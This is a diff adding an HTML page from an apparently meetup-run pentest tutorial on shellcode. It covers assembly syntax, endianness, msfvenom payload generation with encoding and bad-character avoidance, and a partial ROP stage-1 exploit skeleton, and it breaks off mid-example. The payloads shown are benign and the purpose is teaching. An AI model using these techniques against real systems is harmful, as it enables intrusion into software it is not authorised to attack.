@@ -1,0 +1,768 @@
+
+
+<!DOCTYPE html>
+<!--[if IE 8]><html class="no-js lt-ie9" lang="en" > <![endif]-->
+<!--[if gt IE 8]><!--> <html class="no-js" lang="en" > <!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  
+  <title>9.4. Shellcode &mdash; South Bay WASP 1.0.2 documentation</title>
+  
+
+  
+  
+  
+  
+
+  
+
+  
+  
+    
+
+  
+
+  
+  
+    <link rel="stylesheet" href="../_static/css/theme.css" type="text/css" />
+  
+
+  
+
+  
+        <link rel="index" title="Index"
+              href="../genindex.html"/>
+        <link rel="search" title="Search" href="../search.html"/>
+    <link rel="top" title="South Bay WASP 1.0.2 documentation" href="../index.html"/>
+        <link rel="up" title="9. Pentest Buffer Overflow" href="../pentest_buffer_overflow.html"/>
+        <link rel="next" title="10. Pentest scripting" href="../pentest_scripting.html"/>
+        <link rel="prev" title="9.3. Return-oriented programming" href="rop.html"/> 
+
+  
+  <script src="../_static/js/modernizr.min.js"></script>
+
+</head>
+
+<body class="wy-body-for-nav" role="document">
+
+   
+  <div class="wy-grid-for-nav">
+
+    
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
+      <div class="wy-side-scroll">
+        <div class="wy-side-nav-search">
+          
+
+          
+            <a href="../index.html" class="icon icon-home"> South Bay WASP
+          
+
+          
+          </a>
+
+          
+            
+            
+              <div class="version">
+                1.0
+              </div>
+            
+          
+
+          
+<div role="search">
+  <form id="rtd-search-form" class="wy-form" action="../search.html" method="get">
+    <input type="text" name="q" placeholder="Search docs" />
+    <input type="hidden" name="check_keywords" value="yes" />
+    <input type="hidden" name="area" value="default" />
+  </form>
+</div>
+
+          
+        </div>
+
+        <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="main navigation">
+          
+            
+            
+              
+            
+            
+              <p class="caption"><span class="caption-text">Table of Contents</span></p>
+<ul class="current">
+<li class="toctree-l1"><a class="reference internal" href="../pentest_intro.html">1. South Bay WASP Meetup</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_kali.html">2. Kali Linux</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_challenges.html">3. Pentest Challenges</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_encryption.html">4. Encryption</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_html.html">5. HTML</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_network_tools.html">6. Pentest Network Tools</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_recon.html">7. Pentest Reconnaisance</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_study.html">8. Pentest Study</a></li>
+<li class="toctree-l1 current"><a class="reference internal" href="../pentest_buffer_overflow.html">9. Pentest Buffer Overflow</a><ul class="current">
+<li class="toctree-l2"><a class="reference internal" href="assembly.html">9.1. Assembly Language Overview</a></li>
+<li class="toctree-l2"><a class="reference internal" href="elf.html">9.2. ELF and binutils</a></li>
+<li class="toctree-l2"><a class="reference internal" href="rop.html">9.3. Return-oriented programming</a></li>
+<li class="toctree-l2 current"><a class="current reference internal" href="#">9.4. Shellcode</a><ul>
+<li class="toctree-l3"><a class="reference internal" href="#background">9.4.1. Background</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="#what-is-shellcode">9.4.1.1. What is shellcode?</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#intel-vs-at-t-instruction-syntax">9.4.1.2. Intel vs. AT&amp;T instruction syntax</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#vs-64-bit">9.4.1.3. 32 vs 64 bit</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#endianness">9.4.1.4. Endianness</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="#generating-shellcode">9.4.2. Generating shellcode</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="#manually-code">9.4.2.1. Manually code</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#canned-shellcode">9.4.2.2. Canned shellcode</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#id2">9.4.2.3. Metasploit</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="#manipulating-shellcode">9.4.3. Manipulating shellcode</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="#make-python-code-to-work-in-2-and-3-both">9.4.3.1. Make python code to work in 2 and 3 both</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#little-endian-addresses">9.4.3.2. Little-endian addresses</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#shellcode-hex-string-to-binary-file-back">9.4.3.3. Shellcode hex string to binary file &amp; back</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="#reverse-engineering-shellcode">9.4.4. Reverse engineering shellcode</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="#linux-reverse-engineering-shellcode">9.4.4.1. Linux reverse engineering shellcode</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_scripting.html">10. Pentest scripting</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_presentations.html">11. Pentest Presentations</a></li>
+</ul>
+
+            
+          
+        </div>
+      </div>
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">
+
+      
+      <nav class="wy-nav-top" role="navigation" aria-label="top navigation">
+        
+          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+          <a href="../index.html">South Bay WASP</a>
+        
+      </nav>
+
+
+      
+      <div class="wy-nav-content">
+        <div class="rst-content">
+          
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div role="navigation" aria-label="breadcrumbs navigation">
+
+  <ul class="wy-breadcrumbs">
+    
+      <li><a href="../index.html">Docs</a> &raquo;</li>
+        
+          <li><a href="../pentest_buffer_overflow.html">9. Pentest Buffer Overflow</a> &raquo;</li>
+        
+      <li>9.4. Shellcode</li>
+    
+    
+      <li class="wy-breadcrumbs-aside">
+        
+            
+            <a href="../_sources/buffer_overflow/shellcode.rst.txt" rel="nofollow"> View page source</a>
+          
+        
+      </li>
+    
+  </ul>
+
+  
+  <hr/>
+</div>
+          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
+           <div itemprop="articleBody">
+            
+  <div class="section" id="shellcode">
+<h1>9.4. Shellcode<a class="headerlink" href="#shellcode" title="Permalink to this headline">¶</a></h1>
+<div class="section" id="background">
+<h2>9.4.1. Background<a class="headerlink" href="#background" title="Permalink to this headline">¶</a></h2>
+<div class="section" id="what-is-shellcode">
+<h3>9.4.1.1. What is shellcode?<a class="headerlink" href="#what-is-shellcode" title="Permalink to this headline">¶</a></h3>
+<p>Learning about shellcode is a basic requirement for pentesters, but it’s not used much anymore as indicated by the shellcode repository <a class="reference external" href="http://shell-storm.org/shellcode/">Shellcodes database for study cases</a>:</p>
+<blockquote>
+<div>Although now the shellcodes are rarely used, this page lists some shellcodes for study cases and proposes an API to search a specific shellcode. Thanks all for the contribution of this database but we have stop to accept shellcodes because modern exploitation uses now ROP payloads.</div></blockquote>
+<p>What is shellcode? From <a class="reference external" href="http://en.wikipedia.org/wiki/Shellcode">Wikipedia Shellcode</a>:</p>
+<blockquote>
+<div>In computer security, a shellcode is a small piece of code used as the payload in the exploitation of a software vulnerability. It is called “shellcode” because it typically starts a command shell from which the attacker can control the compromised machine, but any piece of code that performs a similar task can be called shellcode.</div></blockquote>
+<p>See <a class="reference external" href="http://www.linuxdevcenter.com/pub/a/linux/2006/05/18/how-shellcodes-work.html">How Shellcodes Work</a> for a useful introduction to how shellcode can differ from normal assembly code. See <a class="reference external" href="https://packetstormsecurity.com/papers/shellcode/">packetstorm shellcode papers</a> and <a class="reference external" href="https://packetstormsecurity.com/shellcode/">packetstorm shellcode</a> for articles.</p>
+</div>
+<div class="section" id="intel-vs-at-t-instruction-syntax">
+<h3>9.4.1.2. Intel vs. AT&amp;T instruction syntax<a class="headerlink" href="#intel-vs-at-t-instruction-syntax" title="Permalink to this headline">¶</a></h3>
+<p>To read assembly you’ll have to know whether you’re reading Intel or AT&amp;T instruction syntax. From <a class="reference external" href="https://en.wikipedia.org/wiki/X86_assembly_language#Syntax">Wikipedia x86 assembly language Syntax</a>:</p>
+<blockquote>
+<div>x86 assembly language has two main syntax branches: Intel syntax, originally used for documentation of the x86 platform, and AT&amp;T syntax. Intel syntax is dominant in the MS-DOS and Windows world, and AT&amp;T syntax is dominant in the Unix world, since Unix was created at AT&amp;T Bell Labs.</div></blockquote>
+<p>Here is an example of setting register eax to 5:</p>
+<div class="highlight-objdump"><div class="highlight"><pre><span></span><span class="x">; AT&amp;T syntax</span>
+<span class="x">mov $5, %eax</span>
+
+<span class="x">; Intel syntax</span>
+<span class="x">mov eax, 5</span>
+</pre></div>
+</div>
+<p><strong class="program">gcc</strong> can use Intel syntax via “-masm=intel”, <strong class="program">gdb</strong> via “set disassembly-flavor intel”.</p>
+</div>
+<div class="section" id="vs-64-bit">
+<h3>9.4.1.3. 32 vs 64 bit<a class="headerlink" href="#vs-64-bit" title="Permalink to this headline">¶</a></h3>
+<p>32-bit and 64-bit assembly differs, starting with the processor registers. See <a class="reference external" href="http://hackeradam17.com/2014/03/18/an-introduction-to-x86_64-assembly-language/">An Introduction to x86_64 Assembly Language</a> for a quick read that describes some of the differences between 32-bit and 64-bit architectures.</p>
+<p>Here are some more links, some of which extend far beyond what a normal pentester could be expected to know.</p>
+<ul class="simple">
+<li><a class="reference external" href="http://ref.x86asm.net/">X86 Opcode and Instruction Reference</a></li>
+<li><a class="reference external" href="http://sandpile.org/">sandpile.org</a></li>
+<li><a class="reference external" href="http://flatassembler.net/">flat assembler</a></li>
+<li><a class="reference external" href="https://en.wikibooks.org/wiki/X86_Assembly">x86 Assembly</a></li>
+<li><a class="reference external" href="http://www.intel.com/content/www/us/en/processors/architectures-software-developer-manuals.html">Intel® 64 and IA-32 Architectures Software Developer Manuals</a></li>
+<li><a class="reference external" href="http://developer.amd.com/resources/documentation-articles/developer-guides-manuals/">Developer Guides, Manuals &amp; ISA Documents</a></li>
+</ul>
+</div>
+<div class="section" id="endianness">
+<h3>9.4.1.4. Endianness<a class="headerlink" href="#endianness" title="Permalink to this headline">¶</a></h3>
+<p><a class="reference external" href="https://en.wikipedia.org/wiki/Endianness">Endianness</a> “refers to the order of the bytes, comprising a digital word, in computer memory. … Intel x86 processors use little-endian.” Take the hex value 0x12345678: the little-endian representation as consecutive bytes would be 0x78, 0x56, 0x34, then 0x12. Remember that shellcode is often input as a string, so byte order is important.</p>
+</div>
+</div>
+<div class="section" id="generating-shellcode">
+<h2>9.4.2. Generating shellcode<a class="headerlink" href="#generating-shellcode" title="Permalink to this headline">¶</a></h2>
+<div class="section" id="manually-code">
+<h3>9.4.2.1. Manually code<a class="headerlink" href="#manually-code" title="Permalink to this headline">¶</a></h3>
+<p>Of course since shellcode is code you can just manually develop the code, though that is out-of-scope here.</p>
+</div>
+<div class="section" id="canned-shellcode">
+<h3>9.4.2.2. Canned shellcode<a class="headerlink" href="#canned-shellcode" title="Permalink to this headline">¶</a></h3>
+<p>There are a number of sites having canned shellcode and you can search for more:</p>
+<dl class="docutils">
+<dt><a class="reference external" href="http://shell-storm.org/shellcode/">Shellcodes database for study cases</a></dt>
+<dd>Although now the shellcodes are rarely used, this page lists some shellcodes for study cases and proposes an API to search a specific shellcode. Thanks all for the contribution of this database but we have stop to accept shellcodes because modern exploitation uses now ROP payloads.</dd>
+<dt><a class="reference external" href="https://www.exploit-db.com/shellcode/">Exploit Database Shellcode</a></dt>
+<dd>Archived shellcode for various operating systems and architectures.</dd>
+</dl>
+</div>
+<div class="section" id="id2">
+<h3>9.4.2.3. Metasploit<a class="headerlink" href="#id2" title="Permalink to this headline">¶</a></h3>
+<p>Metasploit can be used to generate shellcode, both via <strong class="program">msfconsole</strong> (using “generate”) and <strong class="program">msfvenom</strong>. Here we focus on <strong class="program">msfvenom</strong>, though <strong class="program">msfconsole</strong> is needed to determine payload options. There are several new changes regarding Metasploit in Kali 2.0:</p>
+<ul>
+<li><p class="first">Kali 2.0 includes a version of Metasploit Framework.</p>
+<p>Metasploit Community / Pro is no longer installed by default. See <a class="reference external" href="https://community.rapid7.com/community/metasploit/blog/2015/10/20/kali-2-new-operating-systems-support">Now Officially Supporting Kali Linux 2.0</a> for more information.</p>
+</li>
+<li><p class="first"><strong class="program">msfvenom</strong> is replacing <strong class="program">msfpayload</strong> and <strong class="program">msfencode</strong>:</p>
+<p>From <a class="reference external" href="https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom">How to use msfvenom</a>: “Msfvenom is the combination of payload generation and encoding. It will replace msfpayload and msfencode on June 8th 2015.” And from <code class="docutils literal"><span class="pre">man</span> <span class="pre">msfvenom</span></code>: “Msfvenom is a combination of Msfpayload and Msfencode, putting both of these tools into a single Framework instance. Msfvenom has replaced both msfpayload and msfencode as of June 8th, 2015.”</p>
+</li>
+</ul>
+<p>Here is an example of generating shellcode using the Metasploit Framework’s <strong class="program">msfvenom</strong>. See <a class="reference external" href="https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom">How to use msfvenom</a> for more information. For using <strong class="program">msfconsole</strong> exclusively see <a class="reference external" href="https://www.offensive-security.com/metasploit-unleashed/generating-payloads/">‘Generate’ a payload for Metasploit</a>. For an alternate approach see gotm1lk’s <a class="reference external" href="https://github.com/g0tmi1k/mpc/blob/master/mpc.sh">mpc.sh</a>.</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="hll"><span class="c1"># Generating payloads using msfvenom and msfconsole.</span>
+</span><span class="hll"><span class="c1"># Metasploit Framework is installed in /usr/share/framework2</span>
+</span><span class="hll"><span class="nv">PATH</span><span class="o">=</span><span class="nv">$PATH</span>:/usr/share/framework2
+</span><span class="hll"><span class="c1"># To see available payloads, encoders, formats, platforms:</span>
+</span><span class="hll">msfvenom --list payloads
+</span><span class="hll">msfvenom --list encoders
+</span><span class="hll">msfvenom --help-formats
+</span><span class="hll">msfvenom --help-platforms
+</span><span class="c1"># For our example we decide on:</span>
+<span class="c1">#   payload = linux/x86/exec</span>
+<span class="c1">#   encoder = x86/shikata_ga_nai</span>
+<span class="c1">#   platform = linux</span>
+<span class="c1"># NOTE: if specify &quot;--bad-chars&quot; then get encoder even without &quot;--encoder&quot;.</span>
+<span class="hll"><span class="c1"># To see payload variables/options, fire up msfconsole to show the payload options:</span>
+</span><span class="hll">sudo systemctl start postgresql
+</span><span class="hll">sudo msfdb init
+</span><span class="hll">cat <span class="s">&lt;&lt;EOF | sudo msfconsole -r -</span>
+</span><span class="hll"><span class="s">use payload/linux/x86/exec</span>
+</span><span class="hll"><span class="s">show options</span>
+</span><span class="hll"><span class="s">quit</span>
+</span><span class="hll"><span class="s">EOF</span>
+</span><span class="c1"># This shows we need to set CMD=&quot;command string to execute&quot;.</span>
+<span class="c1"># We choose a very simple CMD, merely &quot;echo hello &gt; /tmp/hello&quot;.</span>
+<span class="c1"># Use &quot;ls -al&quot; afterwards to show that the CMD ran.</span>
+
+<span class="hll"><span class="c1"># Here&#39;s the code to generate a python payload:</span>
+</span><span class="hll">msfvenom --payload linux/x86/exec <span class="nv">CMD</span><span class="o">=</span><span class="s1">&#39;echo hello &gt; /tmp/hello&#39;</span> <span class="se">\</span>
+</span><span class="hll">         --encoder x86/shikata_ga_nai <span class="se">\</span>
+</span><span class="hll">         --bad-chars <span class="s2">&quot;\x00\x0a\x0d&quot;</span> <span class="se">\</span>
+</span><span class="hll">         --platform linux --arch x86 <span class="se">\</span>
+</span><span class="hll">         --format python <span class="se">\</span>
+</span><span class="hll">         --out shellcode.py
+</span>
+<span class="c1"># Same shellcode without encoding (has null characters in it).</span>
+msfvenom --payload linux/x86/exec <span class="nv">CMD</span><span class="o">=</span><span class="s1">&#39;echo hello &gt; /tmp/hello&#39;</span> <span class="se">\</span>
+         --platform linux --arch x86 <span class="se">\</span>
+         --format python <span class="se">\</span>
+         --out shellcode_nulls.py
+<span class="c1"># This time as raw bytes.</span>
+msfvenom --payload linux/x86/exec <span class="nv">CMD</span><span class="o">=</span><span class="s1">&#39;echo hello &gt; /tmp/hello&#39;</span> <span class="se">\</span>
+         --platform linux --arch x86 <span class="se">\</span>
+         --format raw <span class="se">\</span>
+         --out shellcode_nulls.raw
+</pre></div>
+</div>
+<p>There are a number of <strong class="program">msfvenom</strong> options for more advanced shellcode generation:</p>
+<div class="highlight-console"><div class="highlight"><pre><span></span><span class="hll"><span class="gp">hacker@kali:~$</span> msfvenom --help
+</span><span class="go">Error: MsfVenom - a Metasploit standalone payload generator.</span>
+<span class="go">Also a replacement for msfpayload and msfencode.</span>
+<span class="go">Usage: /usr/bin/msfvenom [options] &lt;var=val&gt;</span>
+
+<span class="go">Options:</span>
+<span class="go">    -p, --payload       &lt;payload&gt;    Payload to use. Specify a &#39;-&#39; or stdin to use custom payloads</span>
+<span class="go">        --payload-options            List the payload&#39;s standard options</span>
+<span class="go">    -l, --list          [type]       List a module type. Options are: payloads, encoders, nops, all</span>
+<span class="hll"><span class="go">    -n, --nopsled       &lt;length&gt;     Prepend a nopsled of [length] size on to the payload</span>
+</span><span class="go">    -f, --format        &lt;format&gt;     Output format (use --help-formats for a list)</span>
+<span class="go">        --help-formats               List available formats</span>
+<span class="go">    -e, --encoder       &lt;encoder&gt;    The encoder to use</span>
+<span class="go">    -a, --arch          &lt;arch&gt;       The architecture to use</span>
+<span class="go">        --platform      &lt;platform&gt;   The platform of the payload</span>
+<span class="go">        --help-platforms             List available platforms</span>
+<span class="hll"><span class="go">    -s, --space         &lt;length&gt;     The maximum size of the resulting payload</span>
+</span><span class="hll"><span class="go">        --encoder-space &lt;length&gt;     The maximum size of the encoded payload (defaults to the -s value)</span>
+</span><span class="hll"><span class="go">    -b, --bad-chars     &lt;list&gt;       The list of characters to avoid example: &#39;\x00\xff&#39;</span>
+</span><span class="hll"><span class="go">    -i, --iterations    &lt;count&gt;      The number of times to encode the payload</span>
+</span><span class="hll"><span class="go">    -c, --add-code      &lt;path&gt;       Specify an additional win32 shellcode file to include</span>
+</span><span class="hll"><span class="go">    -x, --template      &lt;path&gt;       Specify a custom executable file to use as a template</span>
+</span><span class="hll"><span class="go">    -k, --keep                       Preserve the template behavior and inject the payload as a new thread</span>
+</span><span class="go">    -o, --out           &lt;path&gt;       Save the payload</span>
+<span class="hll"><span class="go">    -v, --var-name      &lt;name&gt;       Specify a custom variable name to use for certain output formats</span>
+</span><span class="hll"><span class="go">        --smallest                   Generate the smallest possible payload</span>
+</span><span class="hll"><span class="go">    -h, --help                       Show this message</span>
+</span></pre></div>
+</div>
+</div>
+</div>
+<div class="section" id="manipulating-shellcode">
+<h2>9.4.3. Manipulating shellcode<a class="headerlink" href="#manipulating-shellcode" title="Permalink to this headline">¶</a></h2>
+<div class="section" id="make-python-code-to-work-in-2-and-3-both">
+<h3>9.4.3.1. Make python code to work in 2 and 3 both<a class="headerlink" href="#make-python-code-to-work-in-2-and-3-both" title="Permalink to this headline">¶</a></h3>
+<p>See <a class="reference external" href="http://www.dwheeler.com/essays/python3-in-python2.html">Python 3 in Python 2.6+</a>. When possible, python should be coded so that the same code can be run &amp; work in both python 2 and 3. So when building up shellcode in python use a bytearray and immediately convert strings to bytes/bytearray. Here goes how to deal with strings, bytes, and little-endian addresses. (See <a class="reference external" href="http://python-future.org/what_else.html#what-else">What else you need to know - bytes &amp; str</a> for alternative approaches.)</p>
+<div class="highlight-python"><div class="highlight"><pre><span></span><span class="n">cat</span> <span class="o">&lt;&lt;</span><span class="s2">&quot;EOF&quot;</span> <span class="o">&gt;</span> <span class="n">p2or3</span><span class="o">.</span><span class="n">py</span>
+<span class="kn">import</span> <span class="nn">struct</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="n">shellcode</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">()</span>
+<span class="n">shellcode</span><span class="o">.</span><span class="n">extend</span><span class="p">(</span><span class="nb">bytearray</span><span class="p">(</span><span class="s2">&quot;/bin/bash&quot;</span><span class="p">,</span><span class="s2">&quot;UTF-8&quot;</span><span class="p">))</span>       <span class="c1"># adding strings</span>
+<span class="n">shellcode</span><span class="o">.</span><span class="n">extend</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot; </span><span class="se">\x31\x32\x33\x34\x35</span><span class="s2">&quot;</span><span class="p">)</span>             <span class="c1"># adding bytes</span>
+<span class="n">shellcode</span><span class="o">.</span><span class="n">extend</span><span class="p">(</span><span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;L&#39;</span><span class="p">,</span><span class="mh">0x89abcdef</span><span class="p">))</span>         <span class="c1"># adding 32 bit address</span>
+<span class="n">shellcode</span><span class="o">.</span><span class="n">extend</span><span class="p">(</span><span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;Q&#39;</span><span class="p">,</span><span class="mh">0x89abcdef01020304</span><span class="p">))</span> <span class="c1"># adding 64 bit address</span>
+<span class="n">output</span> <span class="o">=</span> <span class="nb">getattr</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="p">,</span> <span class="s1">&#39;buffer&#39;</span><span class="p">,</span> <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="p">)</span>     <span class="c1"># sys.stdout.buffer (3), sys.stdout (2)</span>
+<span class="n">output</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span>
+<span class="n">EOF</span>
+<span class="n">python2</span> <span class="n">p2or3</span><span class="o">.</span><span class="n">py</span> <span class="o">|</span> <span class="n">xxd</span> <span class="o">-</span><span class="n">ps</span>
+<span class="n">python3</span> <span class="n">p2or3</span><span class="o">.</span><span class="n">py</span> <span class="o">|</span> <span class="n">xxd</span> <span class="o">-</span><span class="n">ps</span>
+<span class="c1"># both output 2f62696e2f62617368203132333435efcdab8904030201efcdab89</span>
+</pre></div>
+</div>
+<p>Python 2 &amp; 3 treat string &amp; bytes differently. In python 3 a string object is a sequence of characters in some encoding similar to python 2’s unicode object. In python 3 a bytes object is a sequence of bytes, with conversion required to mix with string. Strings in python 2 are really a bytearray so can be mixed with bytes. Python 2 allows <code class="docutils literal"><span class="pre">shellbytes</span> <span class="pre">=</span> <span class="pre">bytearray(&quot;some</span> <span class="pre">string&quot;)</span></code> but python 3 requires <code class="docutils literal"><span class="pre">shellbytes</span> <span class="pre">=</span> <span class="pre">bytearray(&quot;some</span> <span class="pre">string&quot;,</span> <span class="pre">&quot;UTF-8&quot;)</span></code> (note the required string encoding). The best way to deal with this difference is to deal with bytes/bytearray and not strings. After all, shellcode eventually becomes bytes.</p>
+<p>Note that a string like “89abcdef” is 8 characters long while “\x89\xab\xcd\xef” interprets “\xHH” as a hex value representing 1 character leaving “\x89\xab\xcd\xef” as 4 characters.</p>
+</div>
+<div class="section" id="little-endian-addresses">
+<h3>9.4.3.2. Little-endian addresses<a class="headerlink" href="#little-endian-addresses" title="Permalink to this headline">¶</a></h3>
+<p>To illustrate little-endian encoding of addresses, here is part of a ROP-based exploit that defines function <strong class="program">p</strong> using <strong class="program">struct.pack</strong> to ease conversion of memory addresses to a little-endian sequence of bytes. The 2-stage exploit starts off with stage 1 having a call to <strong class="program">scanf</strong> to read the next exploit stage into fixed memory location 0x0804aa24, which <strong class="program">p</strong> converts to \x24\xaa\x04\x08:</p>
+<div class="highlight-python"><div class="highlight"><pre><span></span><span class="hll"><span class="kn">import</span> <span class="nn">struct</span>
+</span>
+<span class="hll"><span class="c1"># return address in little-endian format</span>
+</span><span class="hll"><span class="k">def</span> <span class="nf">p</span><span class="p">(</span><span class="n">addr</span><span class="p">):</span>
+</span><span class="hll">    <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;l&#39;</span><span class="p">,</span> <span class="n">addr</span><span class="p">)</span>
+</span>
+<span class="hll"><span class="c1"># address to load stage 2</span>
+</span><span class="hll"><span class="n">stage2addr</span> <span class="o">=</span> <span class="mh">0x0804aa24</span>
+</span>
+<span class="c1"># create stage 1</span>
+<span class="n">exploit</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">()</span>
+<span class="n">exploit</span><span class="o">.</span><span class="n">extend</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;X&quot;</span><span class="o">*</span><span class="mi">267</span><span class="p">)</span>       <span class="c1"># filler</span>
+<span class="c1"># add addresses for scanf call, gadget to pop 2 scanf arguments, then 2 scanf arguments</span>
+<span class="hll"><span class="n">exploit</span><span class="o">.</span><span class="n">extend</span><span class="p">(</span><span class="n">p</span><span class="p">(</span><span class="mh">0x080483bc</span><span class="p">))</span>  <span class="c1"># scanf address</span>
+</span><span class="hll"><span class="n">exploit</span><span class="o">.</span><span class="n">extend</span><span class="p">(</span><span class="n">p</span><span class="p">(</span><span class="mh">0x08048462</span><span class="p">))</span>  <span class="c1"># address of gadget 0x8048462L: pop ebx ; pop ebp ;;</span>
+</span><span class="hll"><span class="n">exploit</span><span class="o">.</span><span class="n">extend</span><span class="p">(</span><span class="n">p</span><span class="p">(</span><span class="mh">0x08048707</span><span class="p">))</span>  <span class="c1"># address of string &quot;%s&quot;</span>
+</span><span class="hll"><span class="n">exploit</span><span class="o">.</span><span class="n">extend</span><span class="p">(</span><span class="n">p</span><span class="p">(</span><span class="n">stage2addr</span><span class="p">))</span>  <span class="c1"># address where to read in next buffer</span>
+</span><span class="hll"><span class="n">exploit</span><span class="o">.</span><span class="n">extend</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x00</span><span class="s2">&quot;</span><span class="p">)</span>        <span class="c1"># null byte to terminate stage 1</span>
+</span><span class="hll"><span class="c1"># create stage 2</span>
+</span><span class="hll"><span class="c1"># exploit.extend(...)</span>
+</span><span class="hll"><span class="c1"># ...</span>
+</span><span class="hll"><span class="n">exploit</span><span class="o">.</span><span class="n">extend</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x00</span><span class="s2">&quot;</span><span class="p">)</span>        <span class="c1"># null byte to terminate stage 2</span>
+</span></pre></div>
+</div>
+</div>
+<div class="section" id="shellcode-hex-string-to-binary-file-back">
+<h3>9.4.3.3. Shellcode hex string to binary file &amp; back<a class="headerlink" href="#shellcode-hex-string-to-binary-file-back" title="Permalink to this headline">¶</a></h3>
+<p>Shellcode is often provided/generated as a string looking something like “x31xdbxb0x01xcdx80”. Here we illustrate <strong class="program">bash</strong> commands to convert the string to a file containing the raw shellcode and back again.</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">SHELLCODE</span><span class="o">=</span><span class="s2">&quot;\x31\xdb\xb0\x01\xcd\x80&quot;</span>
+<span class="nv">HEX</span><span class="o">=</span><span class="s2">&quot;shellcode.hex&quot;</span>
+<span class="nb">echo</span> -n <span class="s2">&quot;</span><span class="nv">$SHELLCODE</span><span class="s2">&quot;</span> &gt; <span class="nv">$HEX</span>
+<span class="nv">RAW</span><span class="o">=</span><span class="s2">&quot;shellcode.raw&quot;</span>
+
+<span class="c1"># SHELLCODE HEX to RAW</span>
+<span class="c1"># tr to remove \x, xxd for hexdump</span>
+cat <span class="nv">$HEX</span> <span class="p">|</span> tr -d <span class="s1">&#39;\\\x&#39;</span> <span class="p">|</span> xxd -r -p &gt; <span class="nv">$RAW</span>
+xxd -p <span class="nv">$RAW</span>
+
+<span class="c1"># SHELLCODE RAW to HEX</span>
+cat <span class="nv">$RAW</span> <span class="p">|</span> xxd -p <span class="p">|</span> sed -e <span class="s1">&#39;s/\(..\)/\\x\1/g&#39;</span> &gt; <span class="nv">$HEX</span>
+cat <span class="nv">$HEX</span>
+</pre></div>
+</div>
+<p>Next we illustrate <strong class="program">python</strong> transforming bytes/bytearray data to strings of various formats and back:</p>
+<div class="highlight-python"><div class="highlight"><pre><span></span><span class="n">cat</span> <span class="o">&lt;&lt;</span><span class="s2">&quot;EOF&quot;</span> <span class="o">&gt;</span> <span class="n">conversions</span><span class="o">.</span><span class="n">py</span>
+<span class="kn">import</span> <span class="nn">binascii</span>
+
+<span class="c1"># Here&#39;s the raw bytes</span>
+<span class="n">shellcode</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">()</span>
+<span class="n">shellcode</span><span class="o">.</span><span class="n">extend</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x31\xdb\xb0\x01\xcd\x80</span><span class="s2">&quot;</span><span class="p">)</span>
+
+<span class="c1"># Convert to hex string &quot;31dbb001cd80&quot;</span>
+<span class="nb">hex</span> <span class="o">=</span> <span class="n">binascii</span><span class="o">.</span><span class="n">hexlify</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span>
+<span class="k">if</span> <span class="ow">not</span> <span class="nb">isinstance</span><span class="p">(</span><span class="nb">hex</span><span class="p">,</span> <span class="nb">str</span><span class="p">):</span>
+  <span class="nb">hex</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="nb">hex</span><span class="p">,</span> <span class="s1">&#39;ascii&#39;</span><span class="p">)</span>
+<span class="c1"># and to reverse this back to bytes</span>
+<span class="n">shellcode_from_hex</span> <span class="o">=</span> <span class="n">binascii</span><span class="o">.</span><span class="n">unhexlify</span><span class="p">(</span><span class="nb">hex</span><span class="p">)</span>
+
+<span class="c1"># Add colons to get &quot;31:db:b0:01:cd:80&quot;</span>
